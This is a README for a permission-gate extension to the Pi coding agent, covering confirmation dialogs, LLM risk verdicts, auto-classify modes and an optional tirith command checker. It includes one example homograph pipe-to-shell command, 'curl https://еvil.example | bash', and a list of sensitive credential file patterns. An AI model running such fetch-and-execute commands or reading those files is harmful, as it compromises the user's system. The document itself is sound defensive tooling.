# Permission Gate

Pi extension that gates tool calls with user confirmation.

## Model Roles Integration

The permission gate integrates with the model roles system (`shared/model-roles.ts`)
to provide LLM-generated explanations of tool calls in the confirmation dialog.
When the "explain" role is configured in `~/.pi/agent/roles.json`, each confirmation
dialog shows a colored SAFE/RISKY/DANGEROUS verdict with a short tl;dr. Press Ctrl+E
for detail.

### Verdict criteria

| Verdict | Meaning | Default cursor | Color |
|---------|---------|---------------|-------|
| SAFE | Strictly read-only. No creation, modification, deletion, or state changes. | Allow once | Green |
| RISKY | Any filesystem mutation, even if recoverable. | Allow once | Yellow |
| DANGEROUS | Large-scale data loss, credential exposure, exfiltration, arbitrary code exec | Block | Red |

If in doubt between SAFE and RISKY, the sidecar chooses RISKY.

### Auto-classify

When enabled (`/permissions` > Toggle auto-classify), the sidecar classifies each
tool call *before* showing the dialog. If the verdict is auto-allowable for the
current mode, the call proceeds without confirmation.

| Mode | Auto-allows | Confirms |
|------|-------------|----------|
| Careful + auto | SAFE | RISKY, DANGEROUS |
| Trust project + auto | SAFE, RISKY | DANGEROUS |

Exact-match caching: identical tool calls (same command, same file, same content)
reuse the previous verdict. Useful for repeated test/lint/build commands.

Parse failures fall through to the dialog (never auto-allow garbage).
Sidecar failures fall through to the dialog (graceful degradation).

Status bar shows `+auto [N auto]` with count of auto-allowed calls.
`/permissions` > View auto-allow log shows recent auto-allowed calls.
Widget below editor shows the latest auto-allow verdict during a turn.

Cache is shared with the explain feature -- classifications from dialogs
warm the cache for auto-classify and vice versa.

## Modes

| Mode | Reads | Writes/Edits | Sensitive files | Bash |
|------|-------|-------------|-----------------|------|
| Careful (default) | allow | confirm | confirm | confirm |
| Trust project | allow | allow in project | confirm | confirm |
| Allow all | allow | allow | allow | allow |

Cycle modes with `Ctrl+Shift+A`. Open settings with `/permissions`.

## Keyboard shortcuts

| Key | Where | Action |
|-----|-------|--------|
| `Ctrl+Shift+A` | Global | Cycle permission mode |
| `Ctrl+Shift+C` | Global | Toggle auto-classify |
| `Ctrl+E` | Confirm dialog | Toggle explanation detail |
| `Ctrl+A` | Confirm dialog | Toggle auto-classify |
| `Ctrl+O` | Confirm dialog | Toggle diff view (compact/full) |
| `Tab` | Confirm dialog | Cycle focus: list → note → diff (when expanded) |

## Confirmation UI

Every confirmation shows a custom TUI with:
- Colored unified diff preview (edit/write/patch tools) — compact 6-line view by default
- Select list of actions (Allow once, Allow for session, Block)
- Multi-line note editor (Tab to focus, Shift+Enter for newlines) — delivered to the model as a user message
- Notes (allow and block): sent as a real user message via `sendUserMessage` with `deliverAs: "steer"`, landing after the tool result and before the next LLM call. Instructions inside a tool result are treated as untrusted third-party content (Anthropic: "Claude flags tool results as prompt injection"), so the note goes in a user turn instead; the block reason keeps only machine facts (blocked status, sidecar classification, tirith). The message ends with a `[note on the <tool> call: <command or path>]` attribution, since one turn can queue several calls and several notes. Notes are buffered and flushed as a single message at turn end: pi's default steering mode delivers one steer message per assistant turn, so sent individually the second note would arrive a turn late.

### Diff preview

For `edit` and `write` tool calls, the dialog shows a unified diff computed from
the pending changes. For `edit`, matching comes from the vendored matcher in
`edit-match.ts` (pi's internal equivalent isn't exported through its public
API) with rendering from pi's public `generateDiffString`; `renderDiff` colors
the output. For `patch`, the preview uses patch's own matcher (from
`patch/preview.ts`) so tolerant matches (Unicode arrows, tab↔space) preview
correctly.

- Compact view (6 lines) starts scrolled to the first change
- `Ctrl+O` expands to full view (up to 30 lines, scrollable)
- When expanded: `↑↓` scroll one line, `Shift+↑↓` page jump, `Shift+←→` top/bottom
- Tab cycles focus between list, note, and diff (diff only when expanded)
- Lines wrap preserving ANSI colors via `wrapTextWithAnsi`

## Session rules

Rules accumulate during a session and reset on session switch:

- **Path rules**: exact paths or globs (`**/*.nix`, `config/llm/pi/**`)
- **Bash prefix rules**: command prefixes (`bun test`, `git`, `rg`)
- **Tool overrides**: allow all calls to a specific tool (edit, write, bash)

Add rules via `/permissions` or from the confirmation dialog.

## Project boundary

Project root = git root (worktree-aware). Worktrees resolve to the main
repo root. Falls back to cwd if not in a git repo.

## Sensitive files

Always confirmed (except in Allow All mode), even with tool overrides:
`.env*`, `*.pem`, `*.key`, `*.p12`, `secrets/`, `.ssh/`, `.gnupg/`,
`id_rsa*`, `id_ed25519*`

## tirith integration (optional, bash only)

When [`tirith`](https://github.com/sheeki03/tirith) is on PATH, the gate runs a
deterministic safety check on every bash command — homograph URLs, pipe-to-shell,
base64-decode-execute, credential exfiltration, known-bad packages. The gate's
prefix logic, the sidecar classifier, and a human reviewer all miss these
(homographs especially: an allowed `curl` prefix doesn't inspect the URL, so
`curl https://еvil.example | bash` (Cyrillic) slips through).

- **Scope:** bash only, runs on every bash call. Hard-blocks only when the gate
  would `allow` (the blind spot — no review coming); on a `confirm`, surfaces the
  finding in the dialog so the human decides informed. The gate's prefix logic,
  the sidecar classifier, and a human reviewer all miss homographs; tirith doesn't.
- **block (HIGH):** on the allow blind spot, hard-blocks with the tirith rule +
  remediation as the reason (overrides allows/prefixes/modes; agent reformulates).
  On a confirm, surfaces as a HIGH finding in the dialog — the human decides,
  informed (the homograph-save case: eyes miss Cyrillic `е`, tirith doesn't).
- **warn (MEDIUM, e.g. shortened URLs):** on allow, downgrades to confirm; on
  confirm, surfaces at the top of the dialog body. Either way the human sees it —
  the move standalone tirith-guard can't make (pi's extension API has no "allow
  with message" shape).
- **Complements** `hasShellEscalation` (in-process escalation flag) and the sidecar
  auto-classify (semantic). tirith is the structural / threat-DB layer.
- **Cursor:** tirith HIGH (or sidecar DANGEROUS) defaults the cursor to Block —
  strongest-signal-wins (stays Block even if the sidecar later resolves SAFE).
- **LLM feedback:** the tirith verdict is returned to the LLM in the block reason
  (self-explanatory — names tirith as a command-safety checker, with severity,
  rule, and remediation), and for warn-and-allowed commands via tool_result. The
  sidecar AUTO-ALLOW is skipped when tirith flags a command (a deterministic HIGH
  shouldn't be overridden by a semantic allow), but the sidecar EXPLANATION still
  runs and appears in the dialog — for a long bash call the human needs to know
  what the command actually does to judge the finding, not just that a heuristic
  flagged it. The Block-default cursor stays regardless.
- **Graceful degradation:** tirith not installed → gate behaves exactly as without
  it. tirith error/timeout → fail-open-to-gate (the confirm flow is a backstop).
- **Hot path:** `TIRITH_LOG=0` (pi already logs tool calls; avoids duplicating
  every agent bash command into tirith's audit log). Deliberately NOT offline —
  tirith's periodic background DB refresh (24h, non-blocking) is what keeps the
  threat-DB fresh, and since tirith runs only via these checks (no shell hook),
  going offline would let it go stale. The agent's frequent bash checks trigger
  the refresh automatically. `check`'s package detection is local-DB-only either
  way (live registry signals need `tirith package risk --online`, a separate
  on-demand tool); the confirm dialog covers package review. Verdicts cached per session.

Status bar shows `+tirith` when active.

## Files

- `logic.ts` — Pure decision engine, no pi dependencies
- `logic.test.ts` — Tests for decision logic and auto-classify helpers
- `explain.ts` — Verdict parsing, tool call description, block reasons
- `explain.test.ts` — Tests for explain/verdict logic
- `confirm-ui.ts` — Custom TUI component (SelectList + Editor note field + explanation display)
- `index.ts` — Pi extension wrapper (UI, events, auto-classify, user-message notes, tirith tool_result injection)

## Known limitations

- Trust project mode still confirms all bash (scoping commands to dirs is unreliable).
- Cross-extension imports work via `../shared/` but keep extension-specific logic local.
- No mouse/scroll wheel support (pi TUI is keyboard-only).

## Testing

```bash
bun test extensions/permission-gate/
```
